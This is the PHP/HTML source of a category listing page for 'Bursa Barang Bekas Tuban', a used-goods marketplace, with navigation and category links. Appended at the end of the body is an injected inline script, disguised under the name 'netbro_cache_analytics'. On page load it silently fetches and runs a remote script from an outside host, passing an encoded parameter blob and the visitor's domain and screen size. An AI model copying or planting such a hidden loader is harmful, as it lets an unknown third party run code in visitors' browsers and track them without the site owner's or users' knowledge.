<?php
include "db/db.php";
?>

 <?php 

  $query = mysqli_query($koneksi, "SELECT * FROM tadmin WHERE id_admin = '1'");
  $xx1 = mysqli_fetch_array($query);
?>

<!DOCTYPE html>
<html lang="en">
  
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Bursa Barang Bekas Tuban</title>
    <link rel="icon" href="<?php echo $xx1['url_admin'] ?>/img/core-img/favicon.png">
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <!-- Preloader-->
    <div class="preloader" id="preloader">
      <div class="spinner-grow text-secondary" role="status">
        <div class="sr-only">Loading...</div>
      </div>
    </div>
    <!-- Header Area-->
    <div class="header-area" id="headerArea">
      <div class="container h-100 d-flex align-items-center justify-content-between">
        <!-- Logo Wrapper-->
        <div class="logo-wrapper"><a href="<?php echo $xx1['url_admin'] ?>"><img src="<?php echo $xx1['url_admin'] ?>/img/core-img/logo-small.png" alt=""></a></div>
        <!-- Search Form-->
        <div class="top-search-form">
          <form action="cariaja.php" method="get">
            <input class="form-control" type="search" placeholder="Cari Sesuatu ?" name="cari">
            <button type="submit" value="cari"><i class="fa fa-search"></i></button>
          </form>
        </div>
        <!-- Navbar Toggler-->
        <div class="suha-navbar-toggler d-flex justify-content-between flex-wrap" id="suhaNavbarToggler"><span></span><span></span><span></span></div>
      </div>
    </div>
    <!-- Sidenav Black Overlay-->
    <div class="sidenav-black-overlay"></div>
    <!-- Side Nav Wrapper-->
    <div class="suha-sidenav-wrapper" id="sidenavWrapper">
      <!-- Sidenav Profile-->
      <div class="sidenav-profile">
        <div class="user-profile"><img src="img/bg-img/9.jpg" alt=""></div>
        <div class="user-info">
          <h6 class="user-name mb-0">Bursa Barang Bekas</h6>
          <p class="available-balance">Tuban</p>
        </div>
      </div>
      <!-- Sidenav Nav-->
      <ul class="sidenav-nav">
        <li><a href="index.php"><i class="lni-heart-filled"></i>Beranda</a></li>
        <li><a href="kategori-produk.php"><i class="lni-user"></i>Kategori</a></li>
        <li><a href="fs.php"><i class="lni-alarm lni-tada-effect"></i>Flash Sale<span class="ml-3 badge badge-warning">3</span></a></li>
        <li><a href="kontak.php"><i class="lni-empty-file"></i>Kontak</a></li>
        
        <li><a href="pengaturan.php"><i class="lni-cog"></i>Pengaturan</a></li>
      </ul>
      <!-- Go Back Button-->
      <div class="go-home-btn" id="goHomeBtn"><i class="lni-arrow-left"></i></div>
    </div>
    <div class="page-content-wrapper">
      
      <div class="product-catagories-wrapper pt-3">
        <div class="container">
          <div class="section-heading">
            <h6 class="ml-1">Kategori</h6>
          </div>
          <div class="product-catagory-wrap">
            <div class="row">
              <div class="col-4">
                <div class="card mb-3 catagory-card">
                  <div class="card-body"><a href="kategori.php?id=Fashion"><i class="lni-tshirt"></i><span>Fashion</span></a></div>
                </div>
              </div>
              <div class="col-4">
                <div class="card mb-3 catagory-card">
                  <div class="card-body"><a href="kategori.php?id=Barang Antik"><i class="lni-apartment"></i><span>Barang Antik</span></a></div>
                </div>
              </div>
              <div class="col-4">
                <div class="card mb-3 catagory-card">
                  <div class="card-body"><a href="kategori.php?id=Mainan Anak"><i class="lni-burger"></i><span>Mainan Anak</span></a></div>
                </div>
              </div>
              <div class="col-4">
                <div class="card mb-3 catagory-card">
                  <div class="card-body"><a href="kategori.php?id=Olahraga"><i class="lni-cup"></i><span>Olahraga</span></a></div>
                </div>
              </div>
              <div class="col-4">
                <div class="card mb-3 catagory-card">
                  <div class="card-body"><a href="kategori.php?id=Motor Mobil"><i class="lni-car"></i><span>Motor & Mobil</span></a></div>
                </div>
              </div>
              <div class="col-4">
                <div class="card mb-3 catagory-card">
                  <div class="card-body"><a href="kategori.php?id=Gadget"><i class="lni-mobile"></i><span>Gadget</span></a></div>
                </div>
              </div>
              <div class="col-4">
                <div class="card mb-3 catagory-card">
                  <div class="card-body"><a href="kategori.php?id=Elektronik"><i class="lni-support"></i><span>Elektronik</span></a></div>
                </div>
              </div>
              <div class="col-4">
                <div class="card mb-3 catagory-card">
                  <div class="card-body"><a href="kategori.php?id=Sepeda"><i class="lni-cog"></i><span>Sepeda</span></a></div>
                </div>
              </div>
              <div class="col-4">
                <div class="card mb-3 catagory-card">
                  <div class="card-body"><a href="kategori.php?id=Pertanian"><i class="lni-home"></i><span>Pertanian</span></a></div>
                </div>
              </div>
              <div class="col-4">
                <div class="card mb-3 catagory-card">
                  <div class="card-body"><a href="kategori.php?id=Baby Shop"><i class="lni-heart"></i><span>Baby Shop</span></a></div>
                </div>
              </div>
              <div class="col-4">
                <div class="card mb-3 catagory-card">
                  <div class="card-body"><a href="kategori.php?id=Rumah Tangga"><i class="lni-home"></i><span>Rumah Tangga</span></a></div>
                </div>
              </div>
             
            </div>
          </div>
        </div>
      </div>
      
    <!-- Footer Nav-->
    <div class="footer-nav-area" id="footerNav">
      <div class="container h-100 px-0">
        <div class="suha-footer-nav h-100">
          <ul class="h-100 d-flex align-items-center justify-content-between">
            <li><a href="index.php"><i class="lni-home"></i>Beranda</a></li>
            <li><a href="kontak.php"><i class="lni-support"></i>Kontak</a></li>
            <li><a href="fs.php"><i class="lni-heart"></i>Flash Sale</a></li>
            <li><a href="pengaturan.php"><i class="lni-cog"></i>Pengaturan</a></li>
          </ul>
        </div>
      </div>
    </div>
    <!-- All JavaScript Files-->
    <script src="<?php echo $xx1['url_admin'] ?>/js/jquery.min.js"></script>
    <script src="<?php echo $xx1['url_admin'] ?>/js/popper.min.js"></script>
    <script src="<?php echo $xx1['url_admin'] ?>/js/bootstrap.min.js"></script>
    <script src="<?php echo $xx1['url_admin'] ?>/js/waypoints.min.js"></script>
    <script src="<?php echo $xx1['url_admin'] ?>/js/jquery.easing.min.js"></script>
    <script src="<?php echo $xx1['url_admin'] ?>/js/owl.carousel.min.js"></script>
    <script src="<?php echo $xx1['url_admin'] ?>/js/jquery.animatedheadline.min.js"></script>
    <script src="<?php echo $xx1['url_admin'] ?>/js/jquery.counterup.min.js"></script>
    <script src="<?php echo $xx1['url_admin'] ?>/js/wow.min.js"></script>
    <script src="<?php echo $xx1['url_admin'] ?>/js/jarallax.min.js"></script>
    <script src="<?php echo $xx1['url_admin'] ?>/js/jarallax-video.min.js"></script>
    <script src="<?php echo $xx1['url_admin'] ?>/js/default/jquery.passwordstrength.js"></script>
    <script src="<?php echo $xx1['url_admin'] ?>/js/default/dark-mode-switch.js"></script>
    <script src="<?php echo $xx1['url_admin'] ?>/js/default/active.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXkc9%2fYZ3l4t43xB6wYxf7bDv0lRQphRjUWZZcvxFHIFwtcwlYZVem0YNLOybG6hF0Im6GDGcsiB2PALgpu3ZCIJUhFbG%2fiWyiBU%2fFygjuz6Rs75nnjwh2UmjPqWO1XhxNxMQ0XcyyGXDuGeftg%2fRsQb2TsUtCbwbXEdsTN%2b6%2b8oHOexCrdtoLZ8p8ETF%2bsel6kJT4OCTKF0bDttaRW%2flcumn3bTC9Abhsq9EC6KbjLNvJKmJ%2bqkICrCzODryqlv1hvHCDgl%2bTEpEycjzTrW0qyJsw%2fhYxlEc%2fcc0UyKKnI4Qt5LdCIie6KX7UCLyrWGexnZJ5LdTVsf2pKqNa4%2f%2fmG%2fmcjbXwBvnspBaWvXhnD8XgTHKlfBGKd7jxfJ7jgDpIvRWke9wvjhGSYZd8l937s7lzBY1R1i27oG3OGGE7dRZkF74QkAJMBXsWVdYmvzuREZ0xk6tiuFOtbY5Vlvm2XQdpS2pAOxrLEk%2fEsED5rh3Vo6vRV2phbQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>